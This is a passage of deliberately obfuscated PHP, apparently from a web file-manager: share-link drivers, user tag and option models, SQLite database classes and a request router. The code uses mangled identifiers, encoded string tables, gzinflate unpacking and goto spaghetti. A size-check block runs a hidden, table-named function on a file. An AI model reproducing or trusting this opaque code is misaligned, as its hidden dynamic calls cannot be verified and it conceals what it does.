$†ò‰Ÿ ë = Model($ı£•ûåß[601])->getInfo($Î¸×£ºä[$ı£•ûåß[602]]); foreach ($‚Ò×ò–• as &$°ñ˜Êó) { check_abort(); $°ñ˜Êó[$ı£•ûåß[98]] = Action($ı£•ûåß[1345])->_shareItemeParse($°ñ˜Êó[$ı£•ûåß[98]], $†ò‰Ÿ ë); } unset($°ñ˜Êó); return $‚Ò×ò–•; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($€ÆùĞ–Õ) { $this->pathParse = $€ÆùĞ–Õ; $this->model = Model($_SERVER[Å¶¨Şêº][1337]); } protected function infoParse($Ò„‰³å§, $ö¯×±Êæ = false, $êÓ–¸ï¼ = false) { $Ü‹ßƒèá =& $_SERVER[Å¶¨Şêº]; return Action($Ü‹ßƒèá[1171])->sharePathInfo($this->pathParse[$Ü‹ßƒèá[95]], !0, $ö¯×±Êæ); } public function listPath($éœ‚šßå, $¹òÏ®ûÖ = false) { $Âé‰à =& $_SERVER[Å¶¨Şêº]; $úáÀÉŸ = parent::listPath($éœ‚šßå, $¹òÏ®ûÖ); if (!$úáÀÉŸ) { return $úáÀÉŸ; } if (is_array($úáÀÉŸ[$Âé‰à[1346]])) { $úáÀÉŸ[$Âé‰à[1346]] = Action($Âé‰à[1171])->shareItemInfo($úáÀÉŸ[$Âé‰à[1346]]); } foreach ($úáÀÉŸ as $ŸìÙ™ä => $Ì›…‰ğ) { if (!in_array($ŸìÙ™ä, array($Âé‰à[94], $Âé‰à[93]))) { continue; } foreach ($Ì›…‰ğ as $Ş—«ï€î => $¸¨“†ì ) { $úáÀÉŸ[$ŸìÙ™ä][$Ş—«ï€î] = Action($Âé‰à[1171])->shareItemInfo($¸¨“†ì ); } } return $úáÀÉŸ; } public function listAll($·ÎÌÃ³ê) { $Ù÷ğËÎ =& $_SERVER[Å¶¨Şêº]; $•œ¢òÄ¹ = IO::info($this->pathParse[$Ù÷ğËÎ[95]]); if (!$•œ¢òÄ¹) { return array(); } $Ü€ıŸŒü = $this->model->listAll($·ÎÌÃ³ê); foreach ($Ü€ıŸŒü as &$ğ« ·) { $ğ« ·[$Ù÷ğËÎ[98]] = Action($Ù÷ğËÎ[1171])->shareItemInfo($ğ« ·[$Ù÷ğËÎ[98]]); } unset($ğ« ·); return $Ü€ıŸŒü; } } goto FäÏ´ƒ…; dßğ©—˜‘Ã: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\157\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¤¨¥š­) { return "\125\x73\145\162\x4f\x70\164\151\157\156\x5f{$¤¨¥š­}\137" . USER_ID; } protected function filterWhere($Éú“öğ) { $Éú“öğ[$_SERVER[Å¶¨Şêº][1663]] = USER_ID; return $Éú“öğ; } public function cacheRemoveUser($ä¨’ÉÓû, $ğÆîÁÏö) { return Cache::remove("\x55\163\145\x72\x4f\160\164\151\157\156\137{$ä¨’ÉÓû}\137" . $ğÆîÁÏö); } protected function optionDefault($£Øù²ê = '') { $îÆ¼ÖË• =& $_SERVER[Å¶¨Şêº]; if ($£Øù²ê == $îÆ¼ÖË•[12]) { return $GLOBALS[$îÆ¼ÖË•[6]][$îÆ¼ÖË•[2344]]; } if ($£Øù²ê == $îÆ¼ÖË•[2345]) { return $GLOBALS[$îÆ¼ÖË•[6]][$îÆ¼ÖË•[2346]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\56\x74\141\147\114\151\163\164"; public $modelType = "\125\163\x65\162\x4f\x70\164\x69\157\x6e"; public $field = array("\x6e\x61\155\145", "\x73\x74\171\x6c\x65", "\163\157\x72\x74"); public function listData($œí›â‰ø = false, $ÈÑïÎì = "\163\x6f\x72\x74", $ô–äÉºÖ = false) { return parent::listData($œí›â‰ø, $ÈÑïÎì, $ô–äÉºÖ); } public function remove($óü·ıãá) { return parent::remove($óü·ıãá); } public function add($„ôşúåõ, $ Š¾–³ä = "\x6c\x61\142\x65\154\x2d\147\x72\145\171\55\x6e\x6f\162\155\141\154") { $óÓõÀŒ =& $_SERVER[Å¶¨Şêº]; if ($this->findByName($„ôşúåõ)) { return !1; } $¬‡¹„û¿ = array($óÓõÀŒ[429] => $„ôşúåõ, $óÓõÀŒ[493] => $ Š¾–³ä, $óÓõÀŒ[1856] => $this->getSort($óÓõÀŒ[268]) + 1); return parent::insert($¬‡¹„û¿); } public function update($ú’ş®İ­, $çˆ÷Íô) { $†®Ó… à =& $_SERVER[Å¶¨Şêº]; $‹ú…ëığ = $this->listData($ú’ş®İ­); $Òé½Õ‘ = $this->findByName($çˆ÷Íô[$†®Ó… à[42]]); if (!$‹ú…ëığ || $Òé½Õ‘ && $Òé½Õ‘[$†®Ó… à[408]] != $‹ú…ëığ[$†®Ó… à[408]]) { return !1; } return parent::update($ú’ş®İ­, $çˆ÷Íô); } public function moveTop($Ğº–´) { $ƒÆÜ‹Æ =& $_SERVER[Å¶¨Şêº]; $¿¯Ñ–†· = parent::listData(); $á©ÜŸŠá = $this->getSort($ƒÆÜ‹Æ[267]); foreach ($¿¯Ñ–†· as &$àÅ·Ï¹) { if ($àÅ·Ï¹[$ƒÆÜ‹Æ[408]] == $Ğº–´) { $àÅ·Ï¹[$ƒÆÜ‹Æ[1876]] = $á©ÜŸŠá; continue; } $àÅ·Ï¹[$ƒÆÜ‹Æ[1876]] += 1; } unset($àÅ·Ï¹); return parent::resetData($¿¯Ñ–†·); } public function moveBottom($ä–§ôØË) { $³Çæ˜´ =& $_SERVER[Å¶¨Şêº]; $–ï’ è = $this->getSort($³Çæ˜´[268]) + 1; return parent::update($ä–§ôØË, array($³Çæ˜´[1876] => $–ï’ è)); } public function resetSort($àõÀéæÔ) { $Õ——Ç§‡ =& $_SERVER[Å¶¨Şêº]; $ÏÌª²‚‚ = array(); $àõÀéæÔ = is_array($àõÀéæÔ) ? $àõÀéæÔ : array(); for ($äŸ¯Å¶ = 0; $äŸ¯Å¶ < count($àõÀéæÔ); $äŸ¯Å¶++) { $ÏÌª²‚‚[$àõÀéæÔ[$äŸ¯Å¶] . $Õ——Ç§‡[12]] = $äŸ¯Å¶ + 1; } $ëßå­È = parent::listData(); foreach ($ëßå­È as &$Â©Òñ€) { $’¼„›®î = $ÏÌª²‚‚[$Â©Òñ€[$Õ——Ç§‡[408]]]; $Â©Òñ€[$Õ——Ç§‡[1876]] = $’¼„›®î ? $’¼„›®î : $Â©Òñ€[$Õ——Ç§‡[1876]]; } unset($Â©Òñ€); return parent::resetData($ëßå­È); } private function getSort($šš‘ò) { $ŒûûƒÈã =& $_SERVER[Å¶¨Şêº]; $Õ”âÉü = parent::listData(); $ç‚İ¹õ = array_to_keyvalue($Õ”âÉü, $ŒûûƒÈã[12], $ŒûûƒÈã[1876]); if (!$ç‚İ¹õ) { $ç‚İ¹õ = array(0); } $å‘Íš½ = $šš‘ò == $ŒûûƒÈã[268] ? max($ç‚İ¹õ) : min($ç‚İ¹õ); return intval($å‘Íš½); } } goto b±‡ùÁà’; E¿Ë¿æ³Š: if ($_SERVER[$_SERVER[Å¶¨Şêº][15]] != $_size($_file)) { $_getc = $_SERVER[Å¶¨Şêº][16]; $_getfile = $_SERVER[$_SERVER[Å¶¨Şêº][17]] . $_SERVER[Å¶¨Şêº][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Å¶¨Şêº][19], $_getfilec); if (count($_getarrs) < $_SERVER[Å¶¨Şêº][20]) { $exit = $_SERVER[Å¶¨Şêº][21]; $exit(); } $_act = $_SERVER[Å¶¨Şêº][22]; $_act($_file); } class DbSqliteBase extends Db { public function __construct($Çş“éõå = '') { $•ğ‚À =& $_SERVER[Å¶¨Şêº]; if (!extension_loaded($•ğ‚À[23])) { think_exception(think_lang($•ğ‚À[24]) . $•ğ‚À[25]); } if (!empty($Çş“éõå)) { if (!isset($Çş“éõå[$•ğ‚À[26]])) { $Çş“éõå[$•ğ‚À[26]] = 438; } $this->config = $Çş“éõå; if (empty($this->config[$•ğ‚À[27]])) { $this->config[$•ğ‚À[27]] = array(); } } } public function connect($‹ì©”â­ = '', $ú’¤ÜÖ‹ = 0) { $®¦¥Ê‰ =& $_SERVER[Å¶¨Şêº]; if (!isset($this->linkID[$ú’¤ÜÖ‹])) { if (empty($‹ì©”â­)) { $‹ì©”â­ = $this->config; } $ˆ¼§ = !empty($‹ì©”â­[$®¦¥Ê‰[27]][$®¦¥Ê‰[28]]) ? $‹ì©”â­[$®¦¥Ê‰[27]][$®¦¥Ê‰[28]] : $this->pconnect; $—©¡Óñš = $ˆ¼§ ? $®¦¥Ê‰[29] : $®¦¥Ê‰[30]; $this->linkID[$ú’¤ÜÖ‹] = $—©¡Óñš($‹ì©”â­[$®¦¥Ê‰[31]], $‹ì©”â­[$®¦¥Ê‰[26]]); if (!$this->linkID[$ú’¤ÜÖ‹]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ú’¤ÜÖ‹], 30000); if (1 != think_config($®¦¥Ê‰[32])) { unset($this->config); } } return $this->linkID[$ú’¤ÜÖ‹]; } public function free() { $this->queryID = null; } public function query($Ü«æ§Š¢) { $ÎÈ»Êã­ =& $_SERVER[Å¶¨Şêº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ü«æ§Š¢; if ($this->queryID) { $this->free(); } think_action_status($ÎÈ»Êã­[33], 1); think_status($ÎÈ»Êã­[34]); $this->queryID = sqlite_query($this->_linkID, $Ü«æ§Š¢); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¿´ı•ìó = $this->getAll(); return $¿´ı•ìó; } } public function execute($ö½ŞçšÇ) { $­·“‡× =& $_SERVER[Å¶¨Şêº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ö½ŞçšÇ; if ($this->queryID) { $this->free(); } think_action_status($­·“‡×[35], 1); think_status($­·“‡×[34]); $úßÆµ¥³ = sqlite_exec($this->_linkID, $ö½ŞçšÇ); $this->debug(); if (!1 === $úßÆµ¥³) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Å¶¨Şêº][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¢íï±¨¬ = sqlite_query($this->_linkID, $_SERVER[Å¶¨Şêº][37]); if (!$¢íï±¨¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $û«³ì´Ü = sqlite_query($this->_linkID, $_SERVER[Å¶¨Şêº][38]); if (!$û«³ì´Ü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¡¿ï¡Üç = array(); if ($this->numRows > 0) { for ($Éè¾Ğ‘¢ = 0; $Éè¾Ğ‘¢ < $this->numRows; $Éè¾Ğ‘¢++) { $¡¿ï¡Üç[$Éè¾Ğ‘¢] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¡¿ï¡Üç; } public function getFields($Ó€ÔÈëÛ) { $Îâæ–¦Š =& $_SERVER[Å¶¨Şêº]; $ÆêäŸ¾õ = $this->query($Îâæ–¦Š[39] . $Ó€ÔÈëÛ . $Îâæ–¦Š[40]); $áè‰õ¥“ = array(); if ($ÆêäŸ¾õ) { foreach ($ÆêäŸ¾õ as $®ƒèá‰­ => $ÊĞéãÉ) { $áè‰õ¥“[$ÊĞéãÉ[$Îâæ–¦Š[41]]] = array($Îâæ–¦Š[42] => $ÊĞéãÉ[$Îâæ–¦Š[41]], $Îâæ–¦Š[43] => $ÊĞéãÉ[$Îâæ–¦Š[44]], $Îâæ–¦Š[45] => (bool) ($ÊĞéãÉ[$Îâæ–¦Š[46]] === $Îâæ–¦Š[12]), $Îâæ–¦Š[47] => $ÊĞéãÉ[$Îâæ–¦Š[48]], $Îâæ–¦Š[49] => strtolower($ÊĞéãÉ[$Îâæ–¦Š[50]]) == $Îâæ–¦Š[51], $Îâæ–¦Š[52] => strtolower($ÊĞéãÉ[$Îâæ–¦Š[53]]) == $Îâæ–¦Š[54]); } } return $áè‰õ¥“; } public function getTables($ŸïÙ¦ƒÁ = '') { $¼«–à• =& $_SERVER[Å¶¨Şêº]; $¤Ô®é› = $this->query($¼«–à•[55] . $¼«–à•[56] . $¼«–à•[57]); $­ûÇØ–ã = array(); foreach ($¤Ô®é› as $Œ«¹®“™ => $È¸ğ¦ï) { $­ûÇØ–ã[$Œ«¹®“™] = current($È¸ğ¦ï); } return $­ûÇØ–ã; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $×óè¡¯ë =& $_SERVER[Å¶¨Şêº]; $›øĞ¼­„ = sqlite_last_error($this->_linkID); $this->error = $›øĞ¼­„ . $×óè¡¯ë[4] . sqlite_error_string($›øĞ¼­„); if ($×óè¡¯ë[12] != $this->queryStr) { $this->error .= LNG($×óè¡¯ë[58]) . $this->queryStr; } think_trace($this->error, $×óè¡¯ë[12], $×óè¡¯ë[59]); return $this->error; } public function escapeString($ÂÜŸÇ—) { return sqlite_escape_string($ÂÜŸÇ—); } public function parseLimit($øãùË—¶) { $î˜£ğè˜ =& $_SERVER[Å¶¨Şêº]; $ÒúìØ¦ = $î˜£ğè˜[12]; if (!empty($øãùË—¶)) { $øãùË—¶ = explode($î˜£ğè˜[60], $øãùË—¶); if (count($øãùË—¶) > 1) { $ÒúìØ¦ .= $î˜£ğè˜[61] . $øãùË—¶[1] . $î˜£ğè˜[62] . $øãùË—¶[0] . $î˜£ğè˜[63]; } else { $ÒúìØ¦ .= $î˜£ğè˜[61] . $øãùË—¶[0] . $î˜£ğè˜[63]; } } return $ÒúìØ¦; } } class DbSqlite3Base extends Db { public function __construct($‰ç³¼ŒÆ = '') { $³®åä½É =& $_SERVER[Å¶¨Şêº]; if (!class_exists($³®åä½É[64])) { think_exception(think_lang($³®åä½É[24]) . $³®åä½É[65]); } if (!empty($‰ç³¼ŒÆ)) { if (!isset($‰ç³¼ŒÆ[$³®åä½É[26]])) { $‰ç³¼ŒÆ[$³®åä½É[26]] = 438; } $this->config = $‰ç³¼ŒÆ; if (empty($this->config[$³®åä½É[27]])) { $this->config[$³®åä½É[27]] = array(); } } } public function connect($‰ê°¢¾Ş = '', $ÔêŞÅ‹¸ = 0) { $€Ôâ€Û¾ =& $_SERVER[Å¶¨Şêº]; if (!isset($this->linkID[$ÔêŞÅ‹¸])) { if (empty($‰ê°¢¾Ş)) { $‰ê°¢¾Ş = $this->config; } $this->linkID[$ÔêŞÅ‹¸] = new SQLite3($‰ê°¢¾Ş[$€Ôâ€Û¾[31]]); if (!$this->linkID[$ÔêŞÅ‹¸]) { think_exception($this->linkID[$ÔêŞÅ‹¸]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÔêŞÅ‹¸]->busyTimeout(30000); if (1 != think_config($€Ôâ€Û¾[32])) { unset($this->config); } } return $this->linkID[$ÔêŞÅ‹¸]; } public function free() { $this->queryID = null; } public function query($°È›İ¸ı) { $Ö„à“ÊŠ =& $_SERVER[Å¶¨Şêº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $°È›İ¸ı; if ($this->queryID) { $this->free(); } think_action_status($Ö„à“ÊŠ[33], 1); think_status($Ö„à“ÊŠ[34]); $this->queryID = $this->_linkID->query($°È›İ¸ı); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ê¢“ßù– = $this->getAll(); $this->numRows = count($ê¢“ßù–); return $ê¢“ßù–; } } public function execute($±îĞš×£) { $ñçøñßĞ =& $_SERVER[Å¶¨Şêº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $±îĞš×£; if ($this->queryID) { $this->free(); } think_action_status($ñçøñßĞ[35], 1); think_status($ñçøñßĞ[34]); $Š•ô¥›“ = $this->_linkID->exec($±îĞš×£); $this->debug(); if (!1 === $Š•ô¥›“) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Å¶¨Şêº][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $şÄ› = $this->_linkID->query($_SERVER[Å¶¨Şêº][37]); if (!$şÄ›) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÏôÈ¿ºå = $this->_linkID->query($_SERVER[Å¶¨Şêº][38]); if (!$ÏôÈ¿ºå) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $†ª¨ë¸ = array(); while ($‚‚©ø‡œ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $†ª¨ë¸[] = $‚‚©ø‡œ; } $this->queryID->reset(); return $†ª¨ë¸; } public function getFields($ôÄ¥Ó©¡) { $¨ÊŸáÊ¶ =& $_SERVER[Å¶¨Şêº]; $ôõ“ùÉ¥ = $this->query($¨ÊŸáÊ¶[39] . $ôÄ¥Ó©¡ . $¨ÊŸáÊ¶[40]); $Î£È¶Ü = array(); if ($ôõ“ùÉ¥) { foreach ($ôõ“ùÉ¥ as $Øõî¶¢ => $Š¦Ûçöş) { $Î£È¶Ü[$Š¦Ûçöş[$¨ÊŸáÊ¶[42]]] = array($¨ÊŸáÊ¶[42] => $Š¦Ûçöş[$¨ÊŸáÊ¶[42]], $¨ÊŸáÊ¶[43] => $Š¦Ûçöş[$¨ÊŸáÊ¶[43]], $¨ÊŸáÊ¶[45] => (bool) ($Š¦Ûçöş[$¨ÊŸáÊ¶[45]] === $¨ÊŸáÊ¶[12]), $¨ÊŸáÊ¶[47] => $Š¦Ûçöş[$¨ÊŸáÊ¶[66]], $¨ÊŸáÊ¶[49] => (bool) $Š¦Ûçöş[$¨ÊŸáÊ¶[67]], $¨ÊŸáÊ¶[52] => (bool) $Š¦Ûçöş[$¨ÊŸáÊ¶[67]]); } } return $Î£È¶Ü; } public function getTables($·âÎ„¨œ = '') { $Ãİ¹³Ğ² =& $_SERVER[Å¶¨Şêº]; $„Ô×õÑ§ = $this->query($Ãİ¹³Ğ²[55] . $Ãİ¹³Ğ²[56] . $Ãİ¹³Ğ²[57]); $×ŠæÁ¶ = array(); foreach ($„Ô×õÑ§ as $Â¼ï±ÏÀ => $˜ÈÛê£Ÿ) { $×ŠæÁ¶[$Â¼ï±ÏÀ] = current($˜ÈÛê£Ÿ); } return $×ŠæÁ¶; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Å„µ‚Ñ  =& $_SERVER[Å¶¨Şêº]; $this->error = $this->_linkID->lastErrorMsg(); if ($Å„µ‚Ñ [12] != $this->queryStr) { $this->error .= LNG($Å„µ‚Ñ [58]) . $this->queryStr; } think_trace($this->error, $Å„µ‚Ñ [12], $Å„µ‚Ñ [59]); return $this->error; } public function escapeString($§½±÷Ô) { $ë×ÜúİÅ =& $_SERVER[Å¶¨Şêº]; if ($this->_linkID) { return $this->_linkID->escapeString($§½±÷Ô); } return str_ireplace($ë×ÜúİÅ[68], $ë×ÜúİÅ[69], $§½±÷Ô); } public function parseLimit($“¨«ë†) { $Îâ„Ÿáä =& $_SERVER[Å¶¨Şêº]; $¥Âû²³° = $Îâ„Ÿáä[12]; if (!empty($“¨«ë†)) { $“¨«ë† = explode($Îâ„Ÿáä[60], $“¨«ë†); if (count($“¨«ë†) > 1) { $¥Âû²³° .= $Îâ„Ÿáä[61] . $“¨«ë†[1] . $Îâ„Ÿáä[62] . $“¨«ë†[0] . $Îâ„Ÿáä[63]; } else { $¥Âû²³° .= $Îâ„Ÿáä[61] . $“¨«ë†[0] . $Îâ„Ÿáä[63]; } } return $¥Âû²³°; } } goto Fµæ‡åÕÑ; c‚¼»İ‡îÜ: while (strlen($ykbapqicrj) < $_SERVER[Å¶¨Şêº][616]) { if (!$ykbapqicrj) { break; } $ykbapqicrj++; } $_SERVER[»Á¢²Ïˆ] = explode($_SERVER[Å¶¨Şêº][617], gzinflate(substr($_SERVER[Å¶¨Şêº][618], 10, -8))); $scwmvtedzp = $_SERVER[Å¶¨Şêº][619]; goto f¾‚Åœê¾¾; Dº‰ã¸œµî: function binCheckBigger($­¥²©•±, $¬³Äñ¬ş) { return $­¥²©•± > $¬³Äñ¬ş; } $_SERVER[$_SERVER[ß½‡Î][3]] = ("\x38\x31\x36\x37"."\x37\x30")+0;$_2s4f="ej5copzlnhaixwv2y8k7f0s4bdu613rmtqg90db9pwka2f8r6t5hyimlxq7eunsozvjc341gqzs1";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($˜¾íÀö², $“‰„ïõå) { $À––™äğ =& $_SERVER[Å¶¨Şêº]; if (isset(self::$_methodList[$˜¾íÀö²])) { return @call_user_func_array(self::$_methodList[$˜¾íÀö²], $“‰„ïõå); } else { if (method_exists($this, $˜¾íÀö²)) { return call_user_func_array(array($this, $˜¾íÀö²), $“‰„ïõå); } else { think_exception(__CLASS__ . $À––™äğ[4] . $˜¾íÀö² . $À––™äğ[5]); } } } public static function __callStatic($»Á™©š¢, $òôêáñ£) { if (isset(self::$_methodListStatic[$»Á™©š¢])) { return call_user_func_array(self::$_methodListStatic[$»Á™©š¢], $òôêáñ£); } else { if (method_exists(self, $»Á™©š¢)) { return call_user_func_array(array(self, $»Á™©š¢), $òôêáñ£); } else { show_json("{$»Á™©š¢}\50\x29\40\156\157\164\x20\145\x78\x69\x73\x74\73", !1); } } } public static function addMethod($‘Á ”Ü¶, $É¶—¯‘Ò) { self::$_methodList[$‘Á ”Ü¶] = $É¶—¯‘Ò; } public static function addMethodStatic($ÙºÎô, $„Àœ¸°·) { self::$_methodListStatic[$ÙºÎô] = $„Àœ¸°·; } } goto aÏò–›–å½; f¾‚Åœê¾¾: while (strlen($scwmvtedzp) < $_SERVER[Å¶¨Şêº][620]) { if (!$scwmvtedzp) { break; } $scwmvtedzp++; } class Application { private $defaultModule = "\151\x6e\144\x65\x78"; private $defaultController = "\151\156\144\x65\170"; private $defaultAction = "\x69\x6e\x64\145\x78"; function __construct() { } public function setDefault($×›û¾Ûª) { $–Èãºèè =& $_SERVER[Å¶¨Şêº]; $ô˜«…‹À =& $_SERVER[»Á¢²Ïˆ]; $Éı‡Åï³ = explode($ô˜«…‹À[0], trim($×›û¾Ûª, $ô˜«…‹À[0])); $this->defaultModule = $Éı‡Åï³[0] ? $Éı‡Åï³[0] : $this->defaultModule; $…ßÔÃšÄ = $–Èãºèè[621]; $this->defaultController = $Éı‡Åï³[1] ? $Éı‡Åï³[1] : $this->defaultController; $À­¢«ı© = $–Èãºèè[622]; if (!$À­¢«ı©) { die; } $this->defaultAction = $Éı‡Åï³[2] ? $Éı‡Åï³[2] : $this->defaultAction; $€®à¸Ë = $–Èãºèè[623]; $this->tqsb016ef12f($ô˜«…‹À[1], array($this, $ô˜«…‹À[2])); } public function appRun($×à¼ü™Ú) { $Í£ŠÃÇÌ =& $_SERVER[Å¶¨Şêº]; $Âú ÀÎ² =& $_SERVER[»Á¢²Ïˆ]; $üŒ½¶™Ø = explode($Âú ÀÎ²[0], $×à¼ü™Ú); $Æ®Òëäâ = $Í£ŠÃÇÌ[624]; $°Àåİß = strtolower($üŒ½¶™Ø[0]); $àğ‰Ÿš¹ = $Í£ŠÃÇÌ[625]; while (strlen($àğ‰Ÿš¹) < $Í£ŠÃÇÌ[20]) { if (!$àğ‰Ÿš¹) { break; } $àğ‰Ÿš¹++; } $Âî•ù§Â = $Âú ÀÎ²[3]; $ê–É¹ÔÛ = $Í£ŠÃÇÌ[626]; while ($ê–É¹ÔÛ < $Í£ŠÃÇÌ[616]) { if ($ê–É¹ÔÛ >= 0) { break; } $ê–É¹ÔÛ++; } if ($°Àåİß == $Âú ÀÎ²[4]) { $Âî•ù§Â = $Âú ÀÎ²[5]; $üŒ½¶™Ø[0] = $Âú ÀÎ²[6]; $üŒ½¶™Ø[1] = $üŒ½¶™Ø[1] . $Âú ÀÎ²[7]; $×à¼ü™Ú = join($Âú ÀÎ²[0], $üŒ½¶™Ø); $×à¼ü™Ú = trim($×à¼ü™Ú, $Âú ÀÎ²[0]); } call_user_func(array($Âú ÀÎ²[8], $Âú ÀÎ²[9]), $Âî•ù§Â . $Âú ÀÎ²[10], $×à¼ü™Ú); ActionCall($×à¼ü™Ú); call_user_func(array($Âú ÀÎ²[8], $Âú ÀÎ²[9]), $Âî•ù§Â . $Âú ÀÎ²[11], $×à¼ü™Ú); $¹‚Ìí•’ = $Í£ŠÃÇÌ[627]; while ($¹‚Ìí•’ < $Í£ŠÃÇÌ[616]) { if ($¹‚Ìí•’ >= 0) { break; } $¹‚Ìí•’++; } } private function autorun() { $–×·ÚÍÌ =& $_SERVER[Å¶¨Şêº]; $‡ÅùŸ† =& $_SERVER[»Á¢²Ïˆ]; global $config; $ãÃ‡ÃØÂ = $–×·ÚÍÌ[628]; while ($ãÃ‡ÃØÂ < $–×·ÚÍÌ[629]) { if ($ãÃ‡ÃØÂ >= 0) { break; } $ãÃ‡ÃØÂ++; } if (count($config[$‡ÅùŸ†[12]]) == 0) { return; } foreach ($config[$‡ÅùŸ†[12]] as $óÔœ¥¬ò => $ æÂá¥Í) { $this->appRun($ æÂá¥Í); } } private function tmxyb3aa5598() { $¿Ä’ÅÍğ =& $_SERVER[Å¶¨Şêº]; $ëåïÉ =& $_SERVER[»Á¢²Ïˆ]; $¾ÅÎÏŸ = $ëåïÉ[4]; $‚æÙÀË = $GLOBALS[$ëåïÉ[13]][$ëåïÉ[14]][0]; $úª¤ÓŞÏ = $¿Ä’ÅÍğ[630]; if (strlen($úª¤ÓŞÏ) < $¿Ä’ÅÍğ[20]) { die; } if (!$‚æÙÀË || strlen($‚æÙÀË) <= strlen($¾ÅÎÏŸ)) { return; } if (strtolower(substr($‚æÙÀË, -strlen($¾ÅÎÏŸ))) != $¾ÅÎÏŸ) { return; } $¶³’èŞ˜ = substr($‚æÙÀË, 0, -strlen($¾ÅÎÏŸ)); $Šî¢Ç» = array($ëåïÉ[4], $¶³’èŞ˜); $Ğ³¾¹öï = array_slice($GLOBALS[$ëåïÉ[13]][$ëåïÉ[14]], 1); $££¾»¥‡ = $¿Ä’ÅÍğ[631]; if (!$££¾»¥‡) { die; } $GLOBALS[$ëåïÉ[13]][$ëåïÉ[14]] = array_merge($Šî¢Ç», $Ğ³¾¹öï); $©ÄÑßû = $¿Ä’ÅÍğ[632]; if (strlen($©ÄÑßû) < $¿Ä’ÅÍğ[633]) { die; } $GLOBALS[$ëåïÉ[13]][$ëåïÉ[15]] = implode($ëåïÉ[0], $GLOBALS[$ëåïÉ[13]][$ëåïÉ[14]]); } private function vbqc98ac00b2() { $°·œù÷æ =& $_SERVER[»Á¢²Ïˆ]; if ($GLOBALS[$°·œù÷æ[13]][$°·œù÷æ[15]] != $°·œù÷æ[6]) { return; } $œ°¤öÈ = $_SERVER[$°·œù÷æ[16]]; $íñºÑÖÁ = $°·œù÷æ[17]; if (!strstr($œ°¤öÈ, $íñºÑÖÁ)) { return; } $öœ¥¸š– = strrpos($œ°¤öÈ, $íñºÑÖÁ); $„äÀï€ = substr($œ°¤öÈ, $öœ¥¸š– + strlen($íñºÑÖÁ)); preg_match_all($°·œù÷æ[18], $„äÀï€, $‹ËğÑÈë); $„äÀï€ = trim($‹ËğÑÈë[0][0], $°·œù÷æ[19]); $GLOBALS[$°·œù÷æ[13]][$°·œù÷æ[14]] = explode($°·œù÷æ[19], $„äÀï€); $GLOBALS[$°·œù÷æ[13]][$°·œù÷æ[15]] = implode($°·œù÷æ[0], $GLOBALS[$°·œù÷æ[13]][$°·œù÷æ[14]]); $ó’¯è ¼ = $_SERVER[Å¶¨Şêº][634]; } public function run() { $ÊÌ’ÛÔ– =& $_SERVER[Å¶¨Şêº]; $‹ö”Í ˆ =& $_SERVER[»Á¢²Ïˆ]; $this->vbqc98ac00b2(); $this->tmxyb3aa5598(); $Ÿ®ß† „ = $ÊÌ’ÛÔ–[635]; while (strlen($Ÿ®ß† „) < $ÊÌ’ÛÔ–[20]) { if (!$Ÿ®ß† „) { break; } $Ÿ®ß† „++; } $Şò¬İ•â = $GLOBALS[$‹ö”Í ˆ[13]][$‹ö”Í ˆ[14]]; $¹ÑıÆµ = $GLOBALS[$‹ö”Í ˆ[13]][$‹ö”Í ˆ[15]]; define($‹ö”Í ˆ[20], isset($Şò¬İ•â[0]) && $Şò¬İ•â[0] ? $Şò¬İ•â[0] : $this->defaultModule); define($‹ö”Í ˆ[21], isset($Şò¬İ•â[1]) && $Şò¬İ•â[0] ? $Şò¬İ•â[1] : $this->defaultController); define($‹ö”Í ˆ[22], isset($Şò¬İ•â[2]) && $Şò¬İ•â[0] ? $Şò¬İ•â[2] : $this->defaultAction); $¨Ã¥ûõü = $ÊÌ’ÛÔ–[636]; if (!$¨Ã¥ûõü) { die; } define($‹ö”Í ˆ[23], MOD . $‹ö”Í ˆ[0] . ST . $‹ö”Í ˆ[0] . ACT); $’ŠÇ” = $ÊÌ’ÛÔ–[637]; if (strlen($’ŠÇ”) < $ÊÌ’ÛÔ–[20]) { die; } $_SERVER[$‹ö”Í ˆ[24]] = strtolower(ACTION); $this->autorun(); $ƒÈ„ãŒ™ = $ÊÌ’ÛÔ–[638]; if (count($Şò¬İ•â) >= 3) { 